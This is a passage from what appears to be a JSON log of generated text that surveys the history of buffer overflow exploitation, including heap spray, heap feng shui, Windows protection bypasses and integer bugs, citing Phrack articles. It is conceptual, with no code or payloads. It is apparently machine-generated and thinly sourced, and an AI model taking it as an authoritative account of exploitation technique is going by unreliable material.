Heap Spray involved filling the heap with large amounts of memory containing nop sleds and shellcode to predict the memory address for the 'primitive 4-byte overwrite' [7]. Heap Feng Shui was a technique to defragment the heap by filling holes and creating controlled buffers adjacent to the buffer that would be overflowed [7].\n\n# Windows-Based Techniques\nBuffer overflow exploitation and prevention also evolved in the Windows environment with Win32 buffer overflows [3]. Techniques to bypass Windows buffer overflow protection, such as stack backtracing, fake stack frames, userland hooks, and inline function hooking were developed [4]. As Windows implemented more anti-exploitation technologies, attackers required more in-depth knowledge of the underlying operating system and extensive research time to exploit vulnerabilities [8].\n\n# Integer-Related Vulnerabilities\nInteger overflow and integer sign vulnerabilities became more common, leading to increased exploitation of integer-related vulnerabilities [9]. A gcc patch called Big Loop Integer Protection (blip) was introduced to add security checks before 'count loops' to protect applications from integer exploits [9].\n\n# Variable-Length Array Exploitation\nWith the introduction of the C99 standard allowing variable-length array declaration, a rare bug in variable-sized arrays in C was discovered, which could be exploited by shifting the stack pointer [10]. This required an architecture that supports a movable stack and embedded flow control information in the stack for successful exploitation [10].\n\n# Evolving Exploitation Techniques\nOver time, attackers have adapted their techniques to exploit vulnerabilities in various systems, such as Sudo [13], Linux [11], and IIS 7.5 [8]. These exploits often require a deep understanding of the target system, memory allocators, and the specific vulnerability being exploited [8][11][13].\n\n# Conclusion\nBuffer overflow techniques have evolved significantly over time, with attackers developing new methods to bypass security measures and exploit software vulnerabilities. Despite the introduction of various protection systems, attackers continue to find ways to exploit software, requiring constant vigilance and adaptation from security professionals.\n\nReferences:\n[1] phrack-49-14\n[3] phrack-55-15\n[4] phrack-62-5\n[6] phrack-56-5\n[7] phrack-67-8\n[8] phrack-68-12\n[9] phrack-60-9\n[10] phrack-63-14\n[11] phrack-56-14\n[12] phrack-56-8\n[13] phrack-57-8"
            }
          },
          "error": null
        }
      ]
    ]
  }
}
